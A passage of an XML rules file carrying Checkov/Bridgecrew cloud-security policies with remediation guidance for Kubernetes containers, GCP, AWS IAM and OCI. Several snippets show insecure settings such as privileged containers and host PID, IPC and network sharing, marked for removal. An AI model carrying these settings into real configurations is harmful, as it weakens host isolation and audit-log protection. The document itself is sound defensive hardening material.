</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-cloud-audit-logging-is-configured-properly-across-all-services-and-all-users-from-a-project' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-cloud-audit-logging-is-configured-properly-across-all-services-and-all-users-from-a-project</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-cloud-audit-logging-is-configured-properly-across-all-services-and-all-users-from-a-project' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_GCP_1</key>
    <name>Ensure Kubernetes engine cluster nodes do not have default service account for project access</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes-engine-cluster-nodes-have-default-service-account-for-project-access"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes-engine-cluster-nodes-have-default-service-account-for-project-access"></div>Kubernetes engine cluster nodes have default service account for project access</div><a aria-label="Skip link to Kubernetes engine cluster nodes have default service account for project access" class="heading-anchor-icon fa fa-anchor" href="#kubernetes-engine-cluster-nodes-have-default-service-account-for-project-access"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Create and use minimally privileged Service accounts to run GKE cluster nodes instead of using the Compute Engine default Service account. Unnecessary permissions could be abused in the case of a node compromise.<br/>
A GCP service account (as distinct from a Kubernetes ServiceAccount) is an identity that an instance or an application can use to run GCP API requests on your behalf. This identity is used to identify virtual machine instances to other Google Cloud Platform services. By default, Kubernetes Engine nodes use the Compute Engine default service account. This account has broad access by default, as defined by access scopes, making it useful to a wide variety of applications on the VM, but it has more permissions than are required to run your Kubernetes Engine cluster.<br/>
You should create and use a minimally privileged service account to run your Kubernetes Engine cluster instead of using the Compute Engine default service account, and create separate service accounts for each Kubernetes Workload (See Recommendation 6.2.2).<br/>
Kubernetes Engine requires, at a minimum, the node service account to have the monitoring.viewer, monitoring.metricWriter, and logging.logWriter roles. Additional roles may need to be added for the nodes to pull images from GCR.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> google_container_node_pool / google_container_cluster</li>
<li><strong>Argument:</strong> google_project_default_service_accounts</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_project_default_service_accounts" "not_ok" {
  project = "my-project-id"
  action = "DELETE"
  id="1234"
}

resource "google_container_node_pool" "primary_A_not_ok" {
  name       = "my-node-pool"
  ...

  -   service_account = google_project_default_service_accounts.not_ok.id
    oauth_scopes    = [
      "https://www.googleapis.com/auth/cloud-platform"
    ]
  }
}

resource "google_container_cluster" "primary_B_not_ok" {
  
  ...
  node_config {
-   service_account = google_project_default_service_accounts.not_ok.id
    oauth_scopes = [
      "https://www.googleapis.com/auth/cloud-platform"
    ]
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gke-clusters-are-not-running-using-the-compute-engine-default-service-account' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gke-clusters-are-not-running-using-the-compute-engine-default-service-account</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gke-clusters-are-not-running-using-the-compute-engine-default-service-account' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_16</key>
    <name>Ensure container is not privileged</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="container-is-privileged"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-container-is-privileged"></div>Container is privileged</div><a aria-label="Skip link to Container is privileged" class="heading-anchor-icon fa fa-anchor" href="#container-is-privileged"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Privileged containers are containers that have all of the root capabilities of a host machine, allowing access to resources that are not accessible in ordinary containers. Common uses of privileged containers include: running a Docker daemon inside a Docker container, running a container with direct hardware access, and automating CI/CD tasks in the open-source automation server Jenkins.</p>
<p>Running a container with a privileged flag allows users to have critical access to the host&#8217;s resources. If a privileged container is compromised, it does not necessarily entail remote code execution, but it implies that an attacker will be able to run full host root with all of the available capabilities, including  CAP_SYS_ADMIN.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: Container</li>
<li><strong>Argument</strong>: privileged (Optional)<br/>
If true, processes in the privileged containers are essentially equivalent to root on the host. Default to false.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="YAML">apiVersion: v1
kind: Pod
metadata:
  name: &lt;Pod name&gt;
spec:
  containers:
  - name: &lt;container name&gt;
    image: &lt;image&gt;
    securityContext:
-      privileged: true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_15' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_15</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_15' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_21</key>
    <name>Ensure all IAM users are members of at least one IAM group</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="not-all-iam-users-are-members-of-at-least-one-iam-group"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-not-all-iam-users-are-members-of-at-least-one-iam-group"></div>Not all IAM users are members of at least one IAM group</div><a aria-label="Skip link to Not all IAM users are members of at least one IAM group" class="heading-anchor-icon fa fa-anchor" href="#not-all-iam-users-are-members-of-at-least-one-iam-group"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_iam_group_membership, aws_iam_group, aws_iam_user</li>
<li><strong>Argument:</strong> <em>users </em>and <em>group</em> of aws_iam_group_membership</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_iam_group_membership" "ok_group" {
  name = "tf-testing-group-membership"

  users = [
    aws_iam_user.user_good.name,
  ]

  group = aws_iam_group.group.name
}

resource "aws_iam_group" "group" {
  name = "test-group"
}

resource "aws_iam_user" "user_good" {
  name = "test-user"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-all-iam-users-are-members-of-at-least-one-iam-group' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-all-iam-users-are-members-of-at-least-one-iam-group</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-all-iam-users-are-members-of-at-least-one-iam-group' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_17</key>
    <name>Ensure containers do not share host process ID namespace</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="containers-share-host-process-id-namespace"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-containers-share-host-process-id-namespace"></div>Containers share host process ID namespace</div><a aria-label="Skip link to Containers share host process ID namespace" class="heading-anchor-icon fa fa-anchor" href="#containers-share-host-process-id-namespace"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Namespaces provide isolation for running processes and limit access to system resources, without the running process agnostic to its limitations. </p>
<p>To limit an attacker's options to escalate privileges from within a container, we recommend you configure containers to refrain from sharing the host process ID namespace.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: Pod / Deployment / DaemonSet / StatefulSet / ReplicaSet / ReplicationController / Job / CronJob</li>
<li><strong>Argument</strong>: hostPID (Optional)<br/>
If true, the Pod uses the host's PID namespace. Default to false.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Pod</button><button type="button">CronJob</button><button type="button">Other</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="Pod">apiVersion: v1
kind: Pod
metadata:
  name: &lt;name&gt;
spec:
- hostPID: true
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="CronJob">apiVersion: batch/v1beta1
kind: CronJob
metadata:
  name: &lt;name&gt;
spec:
  schedule: &lt;&gt;
  jobTemplate:
    spec:
      template:
        spec:
-          hostPID: true
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="Other">apiVersion: &lt;&gt;
kind: &lt;kind&gt;
metadata:
  name: &lt;name&gt;
spec:
  template:
    spec:
-       hostPID: true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_16' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_16</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_16' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OCI_5</key>
    <name>Ensure OCI Compute Instance has Legacy MetaData service endpoint disabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-compute-instance-has-legacy-metadata-service-endpoint-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-compute-instance-has-legacy-meta-data-service-endpoint-enabled"></div>OCI Compute Instance has Legacy MetaData service endpoint enabled</div><a aria-label="Skip link to OCI Compute Instance has Legacy MetaData service endpoint enabled" class="heading-anchor-icon fa fa-anchor" href="#oci-compute-instance-has-legacy-metadata-service-endpoint-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies the OCI Compute Instances that are configured with Legacy MetaData service (IMDSv1) endpoints enabled. It is recommended that Compute Instances should be configured with legacy v1 endpoints (Instance Metadata Service v1) being disabled, and use Instance Metadata Service v2 instead following security best practices.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-console"></div>OCI Console</div><a aria-label="Skip link to OCI Console" class="heading-anchor-icon fa fa-anchor" href="#oci-console"></a></h2>
<ol>
<li>Login to the OCI Console</li>
<li>Type the resource reported in the alert into the Search box at the top of the Console.</li>
<li>Click the resource reported in the alert from the Resources submenu</li>
<li>In the Instance Details section, next to Instance Metadata Service, click Edit.</li>
<li>For the Allowed IMDS version, select the Version 2 only option.</li>
<li>Click Save Changes.<br/>
Note :<br/>
If you disable IMDSv1 on an instance that does not support IMDSv2, you might not be able to connect to the instance when you launch it. To re enable IMDSv1: using the Console, on the Instance Details page, next to Instance Metadata Service, click Edit. Select the Version 1 and version 2 option, save your changes, and then restart the instance. Using the API, use the UpdateInstance operation.<br/>
FMI : <a href="https://docs.cloud.oracle.com/en-us/iaas/Content/Compute/Tasks/gettingmetadata.htm#upgrading-v2" target="_self">https://docs.cloud.oracle.com/en-us/iaas/Content/Compute/Tasks/gettingmetadata.htm#upgrading-v2</a></li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: oci_core_instance</li>
<li><strong>Arguments</strong>: instance_options.are_legacy_imds_endpoints_disabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "oci_core_instance" "pass" {
...
  instance_options {
    are_legacy_imds_endpoints_disabled = true
  }
...
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-oci-compute-instance-has-legacy-metadata-service-endpoint-disabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-oci-compute-instance-has-legacy-metadata-service-endpoint-disabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-oci-compute-instance-has-legacy-metadata-service-endpoint-disabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_GCP_4</key>
    <name>Ensure GCP log bucket retention policy is configured using bucket lock</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-log-bucket-retention-policy-is-not-configured-using-bucket-lock"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-log-bucket-retention-policy-is-not-configured-using-bucket-lock"></div>GCP log bucket retention policy is not configured using bucket lock</div><a aria-label="Skip link to GCP log bucket retention policy is not configured using bucket lock" class="heading-anchor-icon fa fa-anchor" href="#gcp-log-bucket-retention-policy-is-not-configured-using-bucket-lock"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enabling retention policies on log buckets will protect logs stored in cloud storage buckets from being overwritten or accidentally deleted. It is recommended to set up retention policies and configure Bucket Lock on all storage buckets that are used as log sinks.<br/>
Logs can be exported by creating one or more sinks that include a log filter and a destination. As Stackdriver Logging receives new log entries, they are compared against each sink. If a log entry matches a sink's filter, then a copy of the log entry is written to the destination.<br/>
Sinks can be configured to export logs in storage buckets. It is recommended to configure a data retention policy for these cloud storage buckets and to lock the data retention policy; thus permanently preventing the policy from being reduced or removed. This way, if the system is ever compromised by an attacker or a malicious insider who wants to cover their tracks, the activity logs are definitely preserved for forensics and security investigations.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> google_logging_folder_sink / google_logging_project_sink / google_logging_organization_sink</li>
<li><strong>Argument:</strong> google_storage_bucket</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_storage_bucket" "log_bucket_bad" {
  name = "organization-logging-bucket"

  retention_policy {
    retention_period = 604800
-   is_locked = false
  }
}

resource "google_storage_bucket" "log_bucket_good" {
  name = "organization-logging-bucket"

  retention_policy {
    retention_period = 604800
+   is_locked = true
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-retention-policies-on-log-buckets-are-configured-using-bucket-lock' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-retention-policies-on-log-buckets-are-configured-using-bucket-lock</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-retention-policies-on-log-buckets-are-configured-using-bucket-lock' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_18</key>
    <name>Ensure containers do not share host IPC namespace</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="containers-share-host-ipc-namespace"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-containers-share-host-ipc-namespace"></div>Containers share host IPC namespace</div><a aria-label="Skip link to Containers share host IPC namespace" class="heading-anchor-icon fa fa-anchor" href="#containers-share-host-ipc-namespace"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Pods share many resources, so it could make sense to share a process namespace. Some container images may expect to be isolated from other containers. Not sharing IPC namespaces  helps ensure isolation. Containers in different pods have distinct IP addresses and will need special configuration to communicate by IPC.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: Pod / Deployment / DaemonSet / StatefulSet / ReplicaSet / ReplicationController / Job / CronJob</li>
<li><strong>Argument</strong>: hostIPC (Optional)<br/>
If true, the Pod uses the host's IPC namespace. Default to false.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Pod</button><button type="button">CronJob</button><button type="button">Other</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="Pod">apiVersion: v1
kind: Pod
metadata:
  name: &lt;name&gt;
spec:
- hostIPC: true
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="CronJob">apiVersion: batch/v1beta1
kind: CronJob
metadata:
  name: &lt;name&gt;
spec:
  schedule: &lt;&gt;
  jobTemplate:
    spec:
      template:
        spec:
-          hostIPC: true
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="Other">apiVersion: &lt;&gt;
kind: &lt;kind&gt;
metadata:
  name: &lt;name&gt;
spec:
  template:
    spec:
-       hostIPC: true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_17' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_17</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_17' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_19</key>
    <name>Ensure containers do not share the host network namespace</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="containers-share-the-host-network-namespace"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-containers-share-the-host-network-namespace"></div>Containers share the host network namespace</div><a aria-label="Skip link to Containers share the host network namespace" class="heading-anchor-icon fa fa-anchor" href="#containers-share-the-host-network-namespace"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>When using the host network mode for a container, that container&#8217;s network stack is not isolated from the Docker host, so the container shares the host&#8217;s networking namespace and does not get its own IP-address allocation.</p>
<p>To limit an attacker's options to escalate privileges from within a container, we recommend you to configure containers to not share the host network namespace.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: Pod / Deployment / DaemonSet / StatefulSet / ReplicaSet / ReplicationController / Job / CronJob</li>
<li><strong>Argument</strong>: hostNetwork (Optional)<br/>
If true, the Pod uses the host's network namespace. Default to false.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Pod</button><button type="button">CronJob</button><button type="button">Other</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="Pod">apiVersion: v1
kind: Pod
metadata:
  name: &lt;name&gt;
spec:
- hostNetwork: true
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="CronJob">apiVersion: batch/v1beta1
kind: CronJob
metadata:
  name: &lt;name&gt;
spec:
  schedule: &lt;&gt;
  jobTemplate:
    spec:
      template:
        spec:
-          hostNetwork: true
</code></pre><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="Other">apiVersion: &lt;&gt;
kind: &lt;kind&gt;
metadata:
  name: &lt;name&gt;
spec:
  template:
    spec:
-       hostNetwork: true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_18' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_18</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_18' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OCI_13</key>
    <name>Ensure OCI IAM password policy contains symbols</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-iam-password-policy-for-local-non-federated-users-does-not-have-a-symbol"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-iam-password-policy-for-local-non-federated-users-does-not-have-a-symbol"></div>OCI IAM password policy for local (non-federated) users does not have a symbol</div><a aria-label="Skip link to OCI IAM password policy for local (non-federated) users does not have a symbol" class="heading-anchor-icon fa fa-anchor" href="#oci-iam-password-policy-for-local-non-federated-users-does-not-have-a-symbol"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Oracle Cloud Infrastructure(OCI) accounts that do not have a symbol in the password policy for local (non-federated) users. As a security best practice, configure a strong password policy for secure access to the OCI console.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="oci-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-oci-console"></div>OCI Console</div><a aria-label="Skip link to OCI Console" class="heading-anchor-icon fa fa-anchor" href="#oci-console"></a></h2>
<ol>
<li>Login to the OCI Console Page: <a href="https://console.ap-mumbai-1.oraclecloud.com/" target="_self">https://console.ap-mumbai-1.oraclecloud.com/</a></li>
<li>Go to Identity in the Services menu.</li>
<li>Select Authentication Settings from the Identity menu.</li>
<li>Click Edit Authentication Settings in the middle of the page.</li>
<li>Ensure the checkbox is selected next to MUST CONTAIN AT LEAST 1 SPECIAL CHARACTER.</li>
</ol>
